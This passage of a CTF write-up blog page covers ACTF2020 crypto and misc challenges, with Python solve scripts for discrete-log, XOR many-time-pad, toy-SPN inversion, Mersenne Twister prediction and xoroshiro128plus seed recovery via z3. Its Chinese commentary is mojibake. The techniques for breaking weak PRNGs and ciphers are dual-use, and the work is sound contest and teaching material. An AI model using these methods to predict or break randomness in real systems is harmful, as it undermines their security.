class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string, re</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> argv</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha512</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line">io = remote(argv[<span class="number">1</span>], argv[<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line">flag_dist = (string.ascii_letters + string.digits + <span class="string">"-&#123;&#125;"</span>).encode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">proof_of_work</span><span class="params">()</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">"[:20]="</span>)</span><br><span class="line">    prefix = io.recvline().strip().decode(<span class="string">"utf-8"</span>)</span><br><span class="line">    n = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        pre = sha512(long_to_bytes(n)).hexdigest()[:<span class="number">20</span>]</span><br><span class="line">        <span class="keyword">if</span> pre == prefix:</span><br><span class="line">            io.sendline(str(n))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        n += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bsgs</span><span class="params">(alpha, beta, p)</span>:</span></span><br><span class="line">    res = []</span><br><span class="line">    m = ceil(sqrt(p - <span class="number">1</span>))</span><br><span class="line">    S = &#123;pow(alpha, j, p):j <span class="keyword">for</span> j <span class="keyword">in</span> range(m + <span class="number">1</span>)&#125;</span><br><span class="line">    gs = pow(alpha, p - <span class="number">1</span> - m, p)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(m + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> beta <span class="keyword">in</span> S:</span><br><span class="line">            res.append(i * m + S[beta])</span><br><span class="line">        beta = (beta * gs) % p</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(msg)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> msg:</span><br><span class="line">        <span class="keyword">if</span> m <span class="keyword">not</span> <span class="keyword">in</span> flag_dist:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">level1</span><span class="params">()</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">"p="</span>)</span><br><span class="line">    p = int(io.recvline().strip().decode(<span class="string">"utf-8"</span>))</span><br><span class="line">    g = <span class="number">2</span></span><br><span class="line">    message1 = <span class="string">b""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">        io.recvuntil(<span class="string">"c="</span>)</span><br><span class="line">        c = int(io.recvline().strip().decode(<span class="string">"utf-8"</span>))</span><br><span class="line">        y = bsgs(g, c, p)</span><br><span class="line">        <span class="keyword">if</span> len(y):</span><br><span class="line">            <span class="keyword">for</span> _ <span class="keyword">in</span> y:</span><br><span class="line">                <span class="keyword">if</span> check(long_to_bytes(_)):</span><br><span class="line">                    message1 += long_to_bytes(_)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"Failed."</span>)</span><br><span class="line">            exit(<span class="number">0</span>)</span><br><span class="line">    message1 = message1.decode(<span class="string">"utf-8"</span>)</span><br><span class="line">    print(message1)</span><br><span class="line">    io.sendlineafter(<span class="string">"input the message:"</span>, message1)</span><br><span class="line">    <span class="keyword">return</span> message1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">level2</span><span class="params">()</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">"pubkey= ("</span>)</span><br><span class="line">    pubkey = io.recvline().strip().decode(<span class="string">"utf-8"</span>)[:<span class="number">-1</span>]</span><br><span class="line">    pubkey = [int(_) <span class="keyword">for</span> _ <span class="keyword">in</span> pubkey.split(<span class="string">","</span>)]</span><br><span class="line">    e, g, p = pubkey[<span class="number">0</span>], pubkey[<span class="number">1</span>], pubkey[<span class="number">2</span>]</span><br><span class="line">    io.recvuntil(<span class="string">"cipher= ("</span>)</span><br><span class="line">    cipher = io.recvline().strip().decode(<span class="string">"utf-8"</span>)[:<span class="number">-1</span>]</span><br><span class="line">    cipher = [int(_) <span class="keyword">for</span> _ <span class="keyword">in</span> cipher.split(<span class="string">","</span>)]</span><br><span class="line">    a, b = cipher[<span class="number">0</span>], cipher[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">for</span> d <span class="keyword">in</span> range(<span class="number">2</span>**<span class="number">16</span>):</span><br><span class="line">        message2 = long_to_bytes((inverse(pow(a, d, p), p) * b) % p)</span><br><span class="line">        <span class="keyword">if</span> check(message2):</span><br><span class="line">            message2 = (long_to_bytes(d) + message2).decode(<span class="string">"utf-8"</span>)</span><br><span class="line">            print(message2)</span><br><span class="line">            io.sendlineafter(<span class="string">"input the message:"</span>, message2)</span><br><span class="line">            <span class="keyword">return</span> message2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">level3</span><span class="params">()</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">"p="</span>)</span><br><span class="line">    p = int(io.recvline().strip().decode(<span class="string">"utf-8"</span>))</span><br><span class="line">    params = io.recvline().strip().decode(<span class="string">"utf-8"</span>)</span><br><span class="line">    regex = re.compile(<span class="string">"a=(\d+), b=(\d+)"</span>)</span><br><span class="line">    params = regex.findall(params)[<span class="number">0</span>]</span><br><span class="line">    a, b = int(params[<span class="number">0</span>]), int(params[<span class="number">1</span>])</span><br><span class="line">    Ep = EllipticCurve(GF(p), [a, b])</span><br><span class="line">    message3 = []</span><br><span class="line">    io.recvline()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">        s = io.recvline().strip().decode(<span class="string">"utf-8"</span>)</span><br><span class="line">        regex = re.compile(<span class="string">"G=\((\d+),(\d+)\),C=(\d+)"</span>)</span><br><span class="line">        s = regex.findall(s)[<span class="number">0</span>]</span><br><span class="line">        x, y, c = int(s[<span class="number">0</span>]), int(s[<span class="number">1</span>]), int(s[<span class="number">2</span>])</span><br><span class="line">        G = Ep(x, y)</span><br><span class="line">        C = <span class="number">10000</span> * G</span><br><span class="line">        message3.append(c // int(C[<span class="number">0</span>]))</span><br><span class="line">    message3 = <span class="string">""</span>.join(chr(_) <span class="keyword">for</span> _ <span class="keyword">in</span> message3)</span><br><span class="line">    print(message3)</span><br><span class="line">    io.sendlineafter(<span class="string">"input the message:"</span>, message3)</span><br><span class="line">    <span class="keyword">return</span> message3</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    proof_of_work()</span><br><span class="line">    print(level1() + level2() + level3())</span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<h3 id="imitation-game">Imitation game</h3>
<h4 id="é¢˜è§£åˆ†æ-5">[é¢˜è§£åˆ†æ]</h4>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">iv=getRandomRange(<span class="number">1</span>,<span class="number">0xff</span>)</span><br><span class="line">...</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(iv,message)</span>:</span></span><br><span class="line">    padding=[iv]   </span><br><span class="line">    cipher=[message[<span class="number">0</span>]^padding[<span class="number">0</span>]]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,len_flag):</span><br><span class="line">        <span class="comment">#print(cipher)</span></span><br><span class="line">        padding.append(cipher[i<span class="number">-1</span>]^padding[i<span class="number">-1</span>])</span><br><span class="line">        cipher.append(message[i]^padding[i])</span><br><span class="line">    print(<span class="string">"cipher=&#123;&#125;"</span>.format(cipher))</span><br></pre></td></tr></table></figure>
<p>å³<span class="math inline">\(cipher=[m[0]\oplus iv,m[1]\oplus m[0],...,m[n-1]\oplus m[n-2]]\)</span>.</p>
<p>æ‰€ä»¥çˆ†ç ´ivè·å¾—254ç§å¯èƒ½ä¸­é—´æ€.</p>
<p>è€Œä¸­é—´æ€å’Œflagé—´å…³ç³»å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    message=strxor(flag,plaintext[i])</span><br><span class="line">    encrypt(iv,message)</span><br></pre></td></tr></table></figure>
<p>MTPè€å¥—è·¯äº†- -</p>
<h4 id="exp-5">[exp]</h4>
<p>jupyteré‡Œæ‰‹æ“ï¼Œè€Œä¸”æœ¬é¢˜ä¸­MTPä¸è®ºæ˜¯ç”¨çŒœæµ‹ç©ºæ ¼è¿˜æ˜¯å­—é¢‘åˆ†æéƒ½å­˜åœ¨ä¸€å®šè¯¯å·®ï¼Œéœ€æ‰‹åŠ¨è°ƒæ•´- -è€æ¯›ç—…äº†ï¼ˆä¼°è®¡ä¹Ÿæœ‰å¯èƒ½æ˜¯æˆ‘ä¸€ç›´ç”¨çš„é¢‘ç‡è¡¨ä¸å¤ªå¯¹</p>
<h3 id="naive-aes">naive aes</h3>
<h4 id="é¢˜è§£åˆ†æ-6">[é¢˜è§£åˆ†æ]</h4>
<p>è€ƒå¯Ÿç®€å•çš„Sç›’åŠPç›’é€†å‘ç®—æ³•</p>
<h4 id="exp-6">[exp]</h4>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> hexlify, unhexlify</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha512</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line">io = remote(<span class="string">"actf.node.csuaurora.org"</span>, <span class="string">"28627"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">proof_of_work</span><span class="params">()</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">"[:20]="</span>)</span><br><span class="line">    prefix = io.recvline().strip().decode(<span class="string">"utf-8"</span>)</span><br><span class="line">    n = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        pre = sha512(long_to_bytes(n)).hexdigest()[:<span class="number">20</span>]</span><br><span class="line">        <span class="keyword">if</span> pre == prefix:</span><br><span class="line">            io.sendline(str(n))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        n += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hexpad</span><span class="params">(hexBlock)</span>:</span></span><br><span class="line">    numZeros = <span class="number">8</span> - len(hexBlock)</span><br><span class="line">    <span class="keyword">return</span> numZeros * <span class="string">"0"</span> + hexBlock</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inv_substitute</span><span class="params">(hexBlock)</span>:</span></span><br><span class="line">    substitutedHexBlock = <span class="string">""</span></span><br><span class="line">    substitution = [<span class="number">8</span>, <span class="number">4</span>, <span class="number">15</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">12</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> hexDigit <span class="keyword">in</span> hexBlock:</span><br><span class="line">        newDigit = substitution.index(int(hexDigit, <span class="number">16</span>))</span><br><span class="line">        substitutedHexBlock += hex(newDigit)[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">return</span> substitutedHexBlock</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inv_permute</span><span class="params">(hexBlock)</span>:</span></span><br><span class="line">    inv_permutation = [<span class="number">22</span>, <span class="number">9</span>, <span class="number">15</span>, <span class="number">26</span>, <span class="number">5</span>, <span class="number">25</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">31</span>, <span class="number">29</span>, <span class="number">20</span>, <span class="number">11</span>, <span class="number">17</span>,</span><br><span class="line">                      <span class="number">28</span>, <span class="number">13</span>, <span class="number">8</span>, <span class="number">21</span>, <span class="number">30</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">27</span>, <span class="number">18</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">23</span>, <span class="number">14</span>, <span class="number">19</span>, <span class="number">16</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">10</span>]</span><br><span class="line">    block = int(hexBlock, <span class="number">16</span>)</span><br><span class="line">    permutedBlock = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">        bit = (block &amp; (<span class="number">1</span> &lt;&lt; i)) &gt;&gt; i</span><br><span class="line">        permutedBlock |= bit &lt;&lt; inv_permutation[i]</span><br><span class="line">    <span class="keyword">return</span> hexpad(hex(permutedBlock)[<span class="number">2</span>:])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dec_round</span><span class="params">(hexMessage)</span>:</span></span><br><span class="line">    numBlocks = len(hexMessage) // <span class="number">8</span></span><br><span class="line">    permutedHexMessage = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(numBlocks):</span><br><span class="line">        permutedHexMessage += inv_permute(hexMessage[<span class="number">8</span>*i:<span class="number">8</span>*i+<span class="number">8</span>])</span><br><span class="line">    substitutedHexMessage = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(numBlocks):</span><br><span class="line">        substitutedHexMessage += inv_substitute(permutedHexMessage[<span class="number">8</span>*i:<span class="number">8</span>*i+<span class="number">8</span>])</span><br><span class="line">    <span class="keyword">return</span> substitutedHexMessage</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(hexMessage)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10000</span>):</span><br><span class="line">        hexMessage = dec_round(hexMessage)</span><br><span class="line">    <span class="keyword">return</span> unhexlify(hexMessage.encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    proof_of_work()</span><br><span class="line">    hexMessage = io.recvline().strip().decode(<span class="string">"utf-8"</span>)</span><br><span class="line">    print(decrypt(hexMessage))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<h3 id="tiny_prng0">tiny_PRNG0</h3>
<h4 id="é¢˜è§£åˆ†æ-7">[é¢˜è§£åˆ†æ]</h4>
<p>MT predictï¼Œä¹Ÿæ˜¯ç»å…¸è€ƒç‚¹äº†ï¼Œé¢˜ç›®èƒ½å¾—åˆ°æ— é™é•¿çš„éšæœºæ•°æµï¼Œå–624ä¸ªå³å¯.</p>
<p>å¯ä»¥ç”¨è‡ªå·±å†™çš„è„šæœ¬<a href="https://0xdktb.top/2020/03/27/Summary-of-Crypto-in-CTF-PRNG/#mt---predictbacktrace">https://0xdktb.top/2020/03/27/Summary-of-Crypto-in-CTF-PRNG/#mt---predictbacktrace</a>ï¼Œä¹Ÿå¯ä»¥ç”¨randcrack.</p>
<h4 id="exp-7">[exp]</h4>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> randcrack <span class="keyword">import</span> RandCrack</span><br><span class="line"></span><br><span class="line">Rand = RandCrack()</span><br><span class="line">data = [...]</span><br><span class="line"><span class="keyword">assert</span>(len(data) &gt;= <span class="number">624</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">624</span>):</span><br><span class="line">    Rand.submit(data[i])</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">624</span>, len(data)):</span><br><span class="line">    Rand.predict_randrange(<span class="number">0</span>, <span class="number">0xffffffff</span>)</span><br><span class="line"><span class="keyword">print</span> Rand.predict_randrange(<span class="number">0</span>, <span class="number">0xffffffff</span>)</span><br></pre></td></tr></table></figure>
<p>é¢„æµ‹æˆåŠŸä¸€æ¬¡å³è·å¾—flag.</p>
<h3 id="tiny_prng1">tiny_PRNG1</h3>
<h4 id="é¢˜è§£åˆ†æ-8">[é¢˜è§£åˆ†æ]</h4>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">uint64_t</span> s[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">uint64_t</span> <span class="title">rotl</span><span class="params">(<span class="keyword">const</span> <span class="keyword">uint64_t</span> x, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (x &lt;&lt; k) | (x &gt;&gt; (<span class="number">64</span> - k));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">next</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">uint64_t</span> s0 = s[<span class="number">0</span>];</span><br><span class="line">  <span class="keyword">uint64_t</span> s1 = s[<span class="number">1</span>];</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">uint64_t</span> result = s0 + s1;</span><br><span class="line"></span><br><span class="line">  s1 ^= s0;</span><br><span class="line">  s[<span class="number">0</span>] = rotl(s0, <span class="number">55</span>) ^ s1 ^ (s1 &lt;&lt; <span class="number">14</span>);</span><br><span class="line">  s[<span class="number">1</span>] = rotl(s1, <span class="number">36</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">s[<span class="number">0</span>] = *<span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">uint64_t</span> *&gt;(flag + <span class="number">5</span>);</span><br><span class="line">s[<span class="number">1</span>] = *<span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">uint64_t</span> *&gt;(flag + <span class="number">13</span>);</span><br><span class="line">assert((<span class="string">"Flag length correct"</span>, <span class="built_in">strlen</span>(flag) == <span class="number">22</span>));</span><br></pre></td></tr></table></figure>
<p>nextçš„reå¾ˆç®€å•ï¼Œä½†è¾“å‡ºåªæ˜¯s0+s1ï¼Œæ¨äº†æŒºé•¿ä¸€æ®µæ—¶é—´è§‰å¾—æŒºéº»çƒ¦çš„ï¼Œå°±å°è¯•ç”¨z3ç›´æ¥æ±‚è§£ï¼Œå‰è¿ç»­ä¸¤ä¸ªreså³å¯ç¡®å®šç§å­.</p>
<p>æ‹¿åˆ°flagä»¥åå‘ç°æ˜¯xoroshiro128plus- -</p>
<h4 id="exp-8">[exp]</h4>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> argv</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">mask = <span class="number">2</span>**<span class="number">64</span> - <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rotl</span><span class="params">(x, k)</span>:</span></span><br><span class="line">	<span class="keyword">return</span> ((x &lt;&lt; k) | (x &gt;&gt; (<span class="number">64</span> - k))) &amp; mask</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">next</span><span class="params">(s0, s1)</span>:</span></span><br><span class="line">	s1 ^= s0</span><br><span class="line">	<span class="keyword">return</span> (rotl(s0, <span class="number">55</span>) ^ s1 ^ (s1 &lt;&lt; <span class="number">14</span>)) &amp; mask, rotl(s1, <span class="number">36</span>)</span><br><span class="line"></span><br><span class="line">fl, fr = BitVecs(<span class="string">'fl fr'</span>, <span class="number">64</span>)</span><br><span class="line">s0, s1 = fl, fr</span><br><span class="line">solver = Solver()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> res <span class="keyword">in</span> argv[<span class="number">1</span>:]:</span><br><span class="line">	solver.add((s0 + s1) &amp; mask == int(res, <span class="number">0</span>))</span><br><span class="line">	s0, s1 = next(s0, s1)</span><br><span class="line"></span><br><span class="line">cnt = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">	<span class="keyword">if</span> solver.check() != sat:</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line">	flag = solver.model()</span><br><span class="line">	flag_left, flag_right = flag[fl].as_long(), flag[fr].as_long()</span><br><span class="line">	print(<span class="string">"[&#123;&#125;] - &#123;&#125; | &#123;&#125;"</span>.format(cnt, long_to_bytes(flag_left), long_to_bytes(flag_right)))</span><br><span class="line">	solver.add(And(fl != flag[fl], fr != flag[fr]))</span><br><span class="line">	cnt += <span class="number">1</span></span><br><span class="line">    </span><br><span class="line"><span class="comment"># [1] - b'rihsorox' | b'sulp821o'</span></span><br></pre></td></tr></table></figure>
<h2 id="misc">Misc</h2>
<h3 id="ç­¾åˆ°">ç­¾åˆ°</h3>
<p>å…¬ä¼—å·å›å¤</p>
<h3 id="ç¥å¥‡çš„æ—¶é’Ÿ">ç¥å¥‡çš„æ—¶é’Ÿ</h3>
<h4 id="é¢˜è§£åˆ†æ-9">[é¢˜è§£åˆ†æ]</h4>
<p>hintç»™äº†æ–°åŠ å¡æ¨Ÿå®œæœºåœºï¼ŒæŸ¥äº†ä¸‹æ—¶é’Ÿå¢™å°±çŸ¥é“æ€ä¹ˆå›äº‹äº†- -</p>
<p>csvæ–‡ä»¶ä¸­ç»™å‡ºçš„å‡ä¸ºæ€»ç§’æ•°ï¼Œç”¨matplotlibç»˜å›¾å³å¯</p>
<p><img src= "/img/loading.gif" data-src="/2020/06/06/WriteUp-ACTF2020/image-20200604195637685.png"></p>
<h4 id="exp-9">[exp]</h4>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> matplotlib.lines <span class="keyword">import</span> Line2D</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line">data = [[...],[...],...]</span><br><span class="line"><span class="comment"># (min, sec)</span></span><br><span class="line">params = []</span><br><span class="line"><span class="keyword">for</span> row <span class="keyword">in</span> data:</span><br><span class="line">    param = []</span><br><span class="line">    <span class="keyword">for</span> col <span class="keyword">in</span> row:</span><br><span class="line">        param.append(((col % <span class="number">3600</span>) // <span class="number">60</span>, col % <span class="number">60</span>))</span><br><span class="line">    params.append(param)</span><br><span class="line"><span class="comment"># (delta_x, delta_y)</span></span><br><span class="line">delta = &#123;<span class="number">0</span>: (<span class="number">0</span>, <span class="number">0.5</span>), <span class="number">7</span>: (<span class="number">0.353</span>, <span class="number">0.354</span>), <span class="number">10</span>: (<span class="number">0.433</span>, <span class="number">0.25</span>), <span class="number">15</span>: (<span class="number">0.5</span>, <span class="number">0</span>), <span class="number">20</span>: (<span class="number">0.433</span>, <span class="number">-0.25</span>), <span class="number">23</span>: (<span class="number">0.353</span>, <span class="number">-0.354</span>), <span class="number">30</span>: (<span class="number">0</span>, <span class="number">-0.5</span>), <span class="number">37</span>: (<span class="number">-0.353</span>, <span class="number">-0.354</span>), <span class="number">40</span>: (<span class="number">-0.433</span>, <span class="number">-0.25</span>), <span class="number">45</span>: (<span class="number">-0.5</span>, <span class="number">0</span>), <span class="number">50</span>: (<span class="number">-0.433</span>, <span class="number">0.25</span>), <span class="number">53</span>: (<span class="number">-0.353</span>, <span class="number">0.354</span>)&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># draw</span></span><br><span class="line">figure, ax = plt.subplots()</span><br><span class="line">ax.set_xlim(left=<span class="number">0</span>, right=<span class="number">115</span>)</span><br><span class="line">ax.set_ylim(bottom=<span class="number">0</span>, top=<span class="number">15</span>)</span><br><span class="line">y = <span class="number">10</span></span><br><span class="line"><span class="keyword">for</span> row <span class="keyword">in</span> params:</span><br><span class="line">    x = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> col <span class="keyword">in</span> row:</span><br><span 